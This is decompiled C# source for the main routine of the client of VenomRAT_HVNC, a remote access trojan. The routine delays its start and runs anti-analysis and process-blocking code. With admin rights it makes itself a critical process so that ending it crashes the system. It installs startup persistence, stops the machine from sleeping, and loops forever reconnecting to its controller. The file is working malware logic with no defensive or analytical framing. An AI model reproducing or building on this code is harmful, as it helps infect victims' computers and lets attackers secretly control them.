// Decompiled with JetBrains decompiler
// Type: Client.Program
// Assembly: Client, Version=5.0.0.3, Culture=neutral, PublicKeyToken=null
// MVID: AF1838BC-6B25-40E4-9339-7F493AC3654D
// Assembly location: C:\Users\Younn\RiderProjects\VenomRAT_HVNC-5.0.4.0\VenomRAT_HVNC\bin\Debug\Client.exe

using Client.Connection;
using Client.Helper;
using Client.Install;
using System;
using System.Threading;




namespace Client
{
  public class Program
  {
    public static void Main()
    {
      for (int index = 0; index < Convert.ToInt32(Settings.De_lay); ++index)
        Thread.Sleep(1000);
      if (!Settings.InitializeSettings())
        Environment.Exit(0);
      try
      {
        if (Convert.ToBoolean(Settings.An_ti))
          Anti_Analysis.RunAntiAnalysis();
      }
      catch
      {
      }
      A.B();
      try
      {
        if (!MutexControl.CreateMutex())
          Environment.Exit(0);
      }
      catch
      {
      }
      try
      {
        if (Convert.ToBoolean(Settings.Anti_Process))
          AntiProcess.StartBlock();
      }
      catch
      {
      }
      try
      {
        if (Convert.ToBoolean(Settings.BS_OD))
        {
          if (Methods.IsAdmin())
            ProcessCritical.Set();
        }
      }
      catch
      {
      }
      try
      {
        if (Convert.ToBoolean(Settings.In_stall))
          NormalStartup.Install();
      }
      catch
      {
      }
      Methods.PreventSleep();
      try
      {
        if (Methods.IsAdmin())
          Methods.ClearSetting();
      }
      catch
      {
      }
      while (true)
      {
        try
        {
          if (!ClientSocket.IsConnected)
          {
            ClientSocket.Reconnect();
            ClientSocket.InitializeClient();
          }
        }
        catch
        {
        }
        Thread.Sleep(5000);
      }
    }
  }
}
